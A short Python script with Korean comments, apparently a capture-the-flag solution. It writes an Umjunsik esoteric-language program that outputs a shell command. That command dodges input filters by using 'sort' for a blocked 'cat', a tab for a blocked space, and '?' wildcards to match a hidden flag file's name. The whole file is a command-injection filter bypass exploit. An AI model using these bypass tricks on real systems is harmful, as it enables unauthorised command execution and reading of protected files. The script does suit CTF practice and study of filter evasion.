def create_umjunsik_payload():
    # 1. 목표 명령어 생성
    # - sort: cat 필터링 우회 (파일 내용 출력)
    # - \t: 공백 필터링 우회
    # - /f: 파일명 시작
    # - ?: 와일드카드 (나머지 40글자 매칭)
    # 전체 파일명 길이: / (1) + flag_ (5) + 랜덤32자 (32) + .txt (4) = 42자
    # 입력할 경로: /f (2자) + ? (40자) = 42자 매칭
    target_cmd = "sort\t/f" + "?" * 40
    
    print(f"[+] Target Command: {repr(target_cmd)}")

    # 2. 엄준식 코드 조립
    # 헤더
    umm_code = "어떻게\n"
    
    for char in target_cmd:
        ascii_val = ord(char)
        # '식' + (아스키 코드만큼의 점) + 'ㅋ' 
        # -> 해당 문자를 출력함
        line = "식" + "." * ascii_val + "ㅋ\n"
        umm_code += line
    
    # 푸터 (소스코드 __init__.py/umjunsik.py 의 체크 로직에 맞춰 띄어쓰기 포함)
    umm_code += "이 사람이름이냐ㅋㅋ"
    
    return umm_code

# 파일 생성
payload = create_umjunsik_payload()
filename = "exploit_final.umm"

with open(filename, "w", encoding="utf-8") as f:
    f.write(payload)

print(f"[+] '{filename}' 생성 완료! 이 파일을 업로드하세요.")